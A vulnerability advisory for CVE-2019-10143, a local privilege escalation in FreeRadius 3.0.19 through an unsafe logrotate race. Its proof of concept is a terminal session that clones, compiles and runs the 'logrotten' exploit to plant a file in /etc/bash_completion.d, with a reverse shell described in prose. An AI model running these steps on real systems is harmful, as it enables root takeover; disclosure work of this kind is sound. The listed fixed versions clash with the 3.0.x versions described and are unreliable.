{
    "text": "title : FreeRadius 3.0.19 Logrotate Privilege Escalation  ， detail : FreeRadius versions 3.0.19 and below suffer from a privilege escalation vulnerability via insecure logrotate use.  ， cve : advisories | CVE-2019-10143  ，  ， desc :  # Privilege Escalation via Logrotate in FreeRadius  ，  # Overview  ， Identifier : AIT-SA-20191112-01  ， Target : FreeRadius  ， Vendor : FreeRadius  ， Version : all versions including 3.0.19  ， Fixed in Version : 12.2.3 , 12.1.8 and 12.0.8  ， CVE : https : /nvd.nist.gov/vuln/detail/CVE-2019-10143  ， Accessibility : Local  ， Severity : Low  ， Author : Wolfgang Hotwagner ( AIT Austrian Institute of Technology )   ，  # Summary  ，  [ FreeRadius is a modular Open-Source RADIUS suite. ]  ( https : /freeradius.org/ )   ，  # Vulnerability Description  ， The ownership of the logdirectory \"radacct\" belongs to user \"radiusd\". User \"radiusd\" can elevate the privileges to \"root\" because of an unsafe interaction with logrotate.  ， User \"radiusd\" owns the log directory /var/log/radius/radacct :   ， `  ， drwx-. 3 radiusd radiusd 4096 26. Apr 16 : 01 /var/log/radius/radacct/  ， `  ， Log files rotate once a day ( or any other frequency if configured ) by logrotate as user root. The configuration does not use the \"su\" directive :   ， `  ， /var/log/radius/radacct/ * /detail {  ， monthly  ， rotate 4  ， nocreate  ， missingok  ， compress  ， }  ， `  ， Since logrotate is prone to a race-condition ( see https : /tech.feedyourhead.at/content/details-of-a-logrotate-race-condition ) it is possible for user \"radiusd\" to replace the  ， directory /var/log/radius/radacct/logdir with a symbolic link to any directory ( for example /etc/bash_completion.d ) . logrotate will place the compressed files AS ROOT into /etc/bash_completition.d and set the owner and group to \"radiusd.radiusd\". An attacker could simply place a reverse-shell into this file. As soon as root logs in , a reverse shell will be executed then.  ， Details of the race-condition in logrotate can be found at :   ，  * https : /tech.feedyourhead.at/content/details-of-a-logrotate-race-condition  ，  * https : /tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges  ，  * https : /github.com/whotwagner/logrotten  ，  # Proof of Concept  ， The following example illustrates how an attacker who already gained a shell as user \"radiusd\" , can elevate his privileges to \"root\". After downloading and compiling , the exploit gets executed and waits until the next daily run of logrotate. If the rotation of the log file succeeds , a new file that contains the reverse shell payload , will be written into /etc/bash_completition.d/ with owner \"radiusd\". As soon as root logs in , the reverse shell gets executed and opens a shell on the attackers netcat listener :   ， `  ， radiusd @ redhat7 :  ~  $ git clone https : /github.com/whotwagner/logrotten.git /tmp/logrotten  ， Cloning into '/tmp/logrotten'.  ， remote : Enumerating objects : 84 , done.  ， remote : Counting objects : 100% ( 84/84 )  , done.  ， remote : Compressing objects : 100% ( 58/58 )  , done.  ， remote : Total 84 ( delta 35 )  , reused 64 ( delta 24 )  , pack-reused 0  ， Unpacking objects : 100% ( 84/84 )  , done.  ， radiusd @ redhat7 :  ~  $ mkdir -p /var/log/radius/radacct/logdir  ， radiusd @ redhat7 :  ~  $ touch /var/log/radius/radacct/logdir/detail  ， radiusd @ redhat7 :  ~  $ cd /tmp/logrotten & gcc -o logrotten logrotten.c  ， radiusd @ redhat7 : /tmp/logrotten $ ./logrotten -c /var/log/radius/radacct/logdir/detail  ， Waiting for rotating /var/log/radius/radacct/logdir/detail.  ， Renamed /var/log/radius/radacct/logdir/detail with /var/log/radius/radacct/logdir/detail2 and created symlink to /etc/bash_completion.d  ， Done !   ， radiusd @ redhat7 : /tmp/logrotten $ ls -l /etc/bash_completion.d/  ， total 20  ， -rw-r-r- 1 root root 11144 Oct 28 2018 grub  ， -rw-r-r- 1 radiusd radiusd 33 May 12 18 : 44 detail.1.gz",
    "time": "Nov 15, 2019"
}